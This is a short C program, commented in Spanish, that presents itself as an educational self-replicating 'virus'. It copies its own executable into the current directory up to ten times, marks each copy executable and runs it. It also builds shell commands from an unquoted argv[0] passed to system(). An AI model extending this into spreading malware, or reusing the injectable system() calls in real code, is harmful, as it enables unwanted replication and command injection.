/*
Nombre: Virus Autorreplicante en C
Descripción:
    Este programa implementa un virus autorreplicante que se copia a sí mismo en el directorio actual.
    Se generan hasta un máximo de 10 copias numeradas secuencialmente con el prefijo "VIRUS_NAME".

Funcionamiento:
    - Verifica cuántas copias del virus existen en el directorio actual.
    - Si no ha alcanzado el límite definido en MAX_COPIAS, crea una nueva copia de sí mismo.
    - Asigna permisos de ejecución a la nueva copia.
    - Ejecuta la nueva copia del programa.
    - Si se ha alcanzado el límite, detiene la replicación.

Advertencia:
    - Este código es solo con fines educativos y no debe ejecutarse en sistemas no controlados.
    - La ejecución de código malicioso sin consentimiento es ilegal y antiético.

Compilado con gcc (Debian 12.2.0-14) 12.2.0.

Autor: Germán Riveros S.
Fecha: 31/03/2025
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>

#define VIRUS_NAME "vc0001"
#define EXTENSION ".out"
#define MAX_COPIAS 10

int contar_copias()
{
    int contador = 0;
    struct dirent *entrada;
    DIR *directorio = opendir(".");

    if (directorio == NULL)
    {
        perror("Error al abrir el directorio");
        return 0;
    }

    while ((entrada = readdir(directorio)) != NULL)
    {
        if (strncmp(entrada->d_name, VIRUS_NAME, strlen(VIRUS_NAME)) == 0 && strstr(entrada->d_name, EXTENSION))
        {
            contador++;
        }
    }

    closedir(directorio);
    return contador;
}

int main(int argc, char *argv[])
{
    if (argc < 1)
    {
        fprintf(stderr, "Error: no se pudo obtener el nombre del ejecutable.\n");
        return 1;
    }

    int num_copias = contar_copias();

    if (num_copias < MAX_COPIAS)
    {
        char nuevo_nombre[50];
        snprintf(nuevo_nombre, sizeof(nuevo_nombre), "%s_%d%s", VIRUS_NAME, num_copias + 1, EXTENSION);

        char comando[100];
        snprintf(comando, sizeof(comando), "cp %s %s", argv[0], nuevo_nombre);
        system(comando);

        // Asignar permisos de ejecución a la nueva copia
        char chmod_comando[100];
        snprintf(chmod_comando, sizeof(chmod_comando), "chmod +x %s", nuevo_nombre);
        system(chmod_comando);

        printf("Infectando... Creado %s\n", nuevo_nombre);

        // Ejecutar la nueva copia
        char ejecutar[100];
        snprintf(ejecutar, sizeof(ejecutar), "./%s", nuevo_nombre);
        system(ejecutar);
    }
    else
    {
        printf("Límite de infección alcanzado.\n");
    }

    return 0;
}
